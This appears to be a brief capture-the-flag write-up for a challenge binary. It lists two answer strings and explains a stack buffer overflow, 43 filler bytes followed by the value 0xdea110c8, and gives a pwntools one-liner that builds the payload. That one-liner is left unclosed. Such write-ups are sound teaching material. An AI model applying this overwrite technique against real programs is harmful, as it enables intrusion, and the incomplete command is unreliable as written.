The first two are easy ones.

'Sir Lancelot of Camelot';
'To seek the Holy Grail.';

For the third one see that the input is stored in register 'eax' which is at address ebp-0x3b and the a comparison is done with the value at memory address ebp-0x10. So, we have to give an input which fills 0x3b-0x10 = 43 bytes and then have hex value 0xdea110c8 at memory location ebp-0x10. As we know each ascii character is of one byte so we have 'A'*43 + 0xdea110c8.  

python -c "\
from pwn import *;
print 'Sir Lancelot of Camelot';
print 'To seek the Holy Grail.'; 
print 'A' * 43 + p32(0xdea110c8);
